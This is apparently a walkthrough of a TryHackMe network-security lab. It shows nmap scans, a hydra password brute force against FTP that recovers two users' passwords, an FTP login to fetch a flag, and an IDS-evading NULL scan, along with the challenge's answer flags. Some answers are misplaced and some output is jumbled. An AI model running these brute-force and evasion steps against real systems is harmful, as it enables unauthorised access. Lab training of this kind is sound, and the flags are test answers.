# Task 1 Introduction
Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap, telnet, and hydra. 

# Answer the questions below
Launch the AttackBox and the target VM.   `No answer needed`

# Task 2  Challenge Questions
You can answer the following questions using Nmap, Telnet, and Hydra.

#Answer the questions below
What is the highest port number being open less than 10,000?  Simply run command `sudo nmap -T5 -p- -sV 10.10.196.137`, then get `8080` 

![File Edit View Search Terminal Helo](https://github.com/AChen1719/tryhackme-walkthrough/assets/99749834/abbc9220-57c2-4be3-921b-75bbf1d28595)

There is an open port outside the common 1000 ports; it is above 10,000. What is it? `THM{web_server_25352}`
```
root@ip-10-10-194-84:~# sudo nmap -T5 -p- -sV 10.10.236.70

Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-21 18:24 GMT
Warning: 10.10.236.70 giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-236-70.eu-west-1.compute.internal (10.10.236.70)
Host is up (0.00046s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           (protocol 2.0)
80/tcp    open  http          lighttpd
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Node.js (Express middleware)
10021/tcp open  ftp           vsftpd 3.0.3
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ``` 
`10021` 
# How many TCP ports are open?  Very simple math to get the total tcp open ports. `6` 

# What is the flag hidden in the HTTP server header? 
```root@ip-10-10-194-84:~# sudo nmap -A  10.10.236.70

Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-21 18:51 GMT
Nmap scan report for ip-10-10-236-70.eu-west-1.compute.internal (10.10.236.70)
Host is up (0.00040s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp   open  http          lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp  open  netbios-ssn?
| fingerprint-strings: 
|   SMBProgNeg: 
|_    SMBr
445/tcp  open  microsoft-ds?
| fingerprint-strings: 
|   SMBProgNeg: 
|_    SMBr
8080/tcp open  http          Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=1/21%Time=65AD67B3%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port139-TCP:V=7.60%I=7%D=1/21%Time=65AD67B8%P=x86_64-pc-linux-gnu%r(SMB
SF:ProgNeg,29,"\0\0\0%\xffSMBr\0\0\0\0\x88\x03@\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0@\x06\0\0\x01\0\x01\xff\xff\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port445-TCP:V=7.60%I=7%D=1/21%Time=65AD67B3%P=x86_64-pc-linux-gnu%r(SMB
SF:ProgNeg,29,"\0\0\0%\xffSMBr\0\0\0\0\x88\x03@\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0@\x06\0\0\x01\0\x01\xff\xff\0\0");
MAC Address: 02:37:B1:19:EE:4F (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/21%OT=22%CT=1%CU=31942%PV=Y%DS=1%DC=D%G=Y%M=0237B1%T
OS:M=65AD683A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-01-21 18:53:40
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms ip-10-10-236-70.eu-west-1.compute.internal (10.10.236.70)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.46 seconds
```
What is the flag hidden in the SSH server header?  `THM{946219583339}`

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?  `vsftpd 3.0.3`

We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP? 
     
     1. Create a Text File with the Usernames
     First, you need to create a text file that contains the usernames Eddie and Quinn. Let's call this file usernames.txt. Add the usernames to the file, one per line:
        eddie
        quinn
     
     2. Run Hydra on the Target Host
Now, you can run Hydra on the target host using the FTP protocol. Replace <ip address> with the target host IP and 10021 with the FTP port.
```	
root@ip-10-10-194-84:~# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.236.70:10021
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-01-21 19:13:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ftp://10.10.236.70:10021/
[10021][ftp] host: 10.10.236.70   login: eddie   password: jordan
[10021][ftp] host: 10.10.236.70   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2024-01-21 19:14:26
 ```
     3. Connect to the FTP Server 
Use an FTP client to connect to the FTP server. You'll need to enter the username and password for one of the users (Eddie or Quinn) that you've just found. If you're using the command line, you can use the ftp command followed by the IP address of the target host and the FTP port:
``` 
ftp 10.10.236.70 10021
Connected to 10.10.236.70.
220 (vsFTPd 3.0.3)
Name (10.10.236.70:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
```
    4. Download the Flag File & View the Flag
Now, you can download the flag file using the get command followed by the name of the file. Based on the information provided in the search results, the flag file is likely named ftp_flag.txt. So, you would use:
```
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.02 secs (1.0419 kB/s)
ftp> exit
221 Goodbye.
root@ip-10-10-194-84:~# cat ftp_flag.txt 
THM{321452667098}
```
Browsing to http://10.10.196.137:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

# Your mission is to use Nmap to scan 10.10.236.70 (this machine)
as covertly as possible and avoid being detected by the IDS.

TCP FIN, NULL, and Xmas Scans (-sF, -sN, -sX): These special-purpose scan types are adept at sneaking past firewalls to explore the systems behind them. Unfortunately, they rely on target behavior that some systems (particularly Windows variants) don't exhibit. Below example showed only -sN can bypass the firewall in the target host. 

```
nmapStarting Nmap 7.60 ( https://nmap.org ) at 2024-01-21 19:36 GMT
Nmap scan report for ip-10-10-236-70.eu-west-1.compute.internal (10.10.236.70)
Host is up (0.00038s latency).
Not shown: 995 closed ports
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
MAC Address: 02:37:B1:19:EE:4F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 95.68 seconds
-sN 10.10.236.70
```
`THM{f7443f99}`

# Task 3 Summary
Congratulations. In this module, we have learned about passive reconnaissance, active reconnaissance, Nmap, protocols and services, and attacking logins with Hydra.

# Answer the questions below
Time to continue your journey with a new module.  `No answer needed`

